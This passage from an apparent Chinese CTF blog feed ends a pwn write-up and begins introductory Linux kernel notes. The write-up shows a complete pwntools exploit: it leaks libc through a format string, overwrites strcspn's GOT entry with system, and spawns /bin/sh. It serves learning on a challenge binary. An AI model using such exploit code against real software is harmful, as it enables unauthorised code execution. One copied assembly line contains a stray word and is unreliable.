class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">read_string</span><span class="params">(_QWORD *a1, _QWORD *a2, _BYTE *a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> byte; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *a3 = <span class="number">0</span>;</span><br><span class="line">  result = (_BYTE *)read_byte(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result != <span class="number">0xB</span> )                 <span class="comment">// 第一个字节要是0b</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read string&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      byte = read_byte(a1, a2);</span><br><span class="line">      v10 |= (byte &amp; <span class="number">0x7F</span>) &lt;&lt; i;</span><br><span class="line">      <span class="keyword">if</span> ( byte &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = a4;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; v10 )</span><br><span class="line">        v6 = v10;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt;= j )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      a3[j] = read_byte(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 &gt; j )</span><br><span class="line">    &#123;</span><br><span class="line">      read_byte(a1, a2);</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( a4 &lt;= v10 )</span><br><span class="line">      v7 = a4;</span><br><span class="line">    result = &amp;a3[v7];</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看read_byte函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_byte</span><span class="params">(_QWORD *ptr1, _QWORD *ptr2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*ptr2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to read replay&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *(_BYTE *)(*ptr1)++;</span><br><span class="line">  --*ptr2;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂的一匹，但是搞懂每个函数的内容，然后再一步一步来，便不会有太大的困难</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./format&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">content=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            gdb.attach(p,content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">            pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span>(local):</span><br><span class="line">        <span class="keyword">return</span> process(elf_path)</span><br><span class="line">    <span class="keyword">return</span> remote()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_bytes</span>(<span class="params">nb:<span class="built_in">int</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;55&#x27;</span>*nb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    size = (<span class="built_in">hex</span>(<span class="built_in">len</span>(s))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = binascii.hexlify(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    info(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span> + <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;0b&quot;</span> + size + data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(payload) == <span class="built_in">bytes</span>:</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">    payload_ =consume_bytes(<span class="number">5</span>)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;11112222&quot;</span>)</span><br><span class="line">    payload_ +=read_string(payload)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;ohh good&quot;</span>)</span><br><span class="line">    payload_ +=consume_bytes(<span class="number">10</span>+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload_)</span><br><span class="line">    sla(<span class="string">b&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n&quot;</span>,payload_)</span><br><span class="line">    ru(<span class="string">b&quot;Player name: &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">leaklibc = input_1(<span class="string">&quot;%3$p&quot;</span>)</span><br><span class="line">info(<span class="string">f&#x27;leaklibc===&gt;<span class="subst">&#123;leaklibc&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(leaklibc,<span class="number">16</span>)-<span class="number">0x114887</span></span><br><span class="line">info(<span class="string">f&#x27;libc_base===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">auto = FmtStr(input_1,offset=<span class="number">14</span>)   <span class="comment">#input_1是往addr写入value的值，offset是偏移</span></span><br><span class="line"><span class="comment"># [*] Found format string offset: 14</span></span><br><span class="line"><span class="comment"># one = pack(libc.address + 0xebc81)    #这是某个one_gadget</span></span><br><span class="line">auto.write(elf.got[<span class="string">&#x27;strcspn&#x27;</span>],libc.sym.system)  <span class="comment">#先打包一个strcspn写入system的字节串</span></span><br><span class="line">auto.execute_writes()      <span class="comment">#然后再写入</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>总结 做格式化字符串漏洞的时候应该先把向addr写入value的自动函数写出来（不要怕麻烦，这样之后可以节省很多的麻烦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;h1 id=&quot;float&quot;&gt;&lt;a href=&quot;#float&quot; class=&quot;headerlink&quot; title=&quot;float&quot;&gt;</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel note</title>
    <link href="http://s1nec-1o.github.io/2024/04/28/kernel-note/"/>
    <id>http://s1nec-1o.github.io/2024/04/28/kernel-note/</id>
    <published>2024-04-28T11:15:48.000Z</published>
    <updated>2024-04-28T14:13:18.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kernel笔记"><a href="#kernel笔记" class="headerlink" title="kernel笔记"></a>kernel笔记</h1><p>首先是要配置环境，推荐[wiki](<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">Qemu 模拟环境 - CTF Wiki (ctf-wiki.org)</a>)和<a href="https://www.cjovi.icu/pwnreview/1318.html">这篇文章</a></p><p>其中调试部分我还搁置着准备等学有所成再来实战</p><p>可以将内核看作一个巨大的elf，它又有数据段</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>kernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p><p><img src="C:/Users/Lenovo/Pictures/Saved%20Pictures/Kernel_Layout.svg+xml"></p><p>kernel 最主要的功能有两点：</p><ol><li>控制并与硬件进行交互</li><li>提供 application 能运行的环境</li></ol><p>包括 I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p><h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul><li><strong>insmod</strong>: 讲指定模块加载到内核中</li><li><strong>rmmod</strong>: 从内核中卸载指定模块</li><li><strong>lsmod</strong>: 列出已经加载的模块</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li></ul><blockquote><p>大多数　CTF 中的 kernel vulnerability 也出现在 LKM 中。</p></blockquote><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p><blockquote><p>在 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h</em> 和 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p><p>同时推荐一个很好用的网站 <a href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>，可以查阅 32 位系统调用对应的寄存器含义以及源码。64 位系统调用可以查看 <a href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a></p></blockquote><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>直接查看 man 手册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The <span class="title function_">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       <span class="title function_">files</span>  <span class="params">(e.g., terminals)</span> may be controlled with <span class="title function_">ioctl</span><span class="params">()</span> requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&#x27;s traditionally <span class="type">char</span> *<span class="title function_">argp</span> <span class="params">(from the days</span></span><br><span class="line"><span class="params">       before <span class="type">void</span> * was valid C)</span>, and will be so named <span class="keyword">for</span> this discussion.</span><br><span class="line"></span><br><span class="line">       An <span class="title function_">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an <span class="title function_">ioctl</span><span class="params">()</span> request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p><p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><blockquote><p>使用 ioctl 进行通信的原因：</p><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p><p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p><p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h2 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h2><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</p></li><li><p>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li></ol><h2 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h2><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span 